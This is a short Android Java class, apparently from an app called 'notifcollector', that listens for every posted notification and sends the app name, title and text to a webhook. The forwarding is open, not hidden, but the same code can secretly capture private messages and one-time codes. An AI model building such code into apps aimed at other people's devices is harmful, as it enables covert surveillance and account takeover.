package com.sayeed.notifcollector;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifListenerService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title", "");
        CharSequence textCs = extras.getCharSequence("android.text");
        String text = textCs == null ? "" : textCs.toString();

        Webhook.send(getApplicationContext(), pkg, title, text);
    }
}
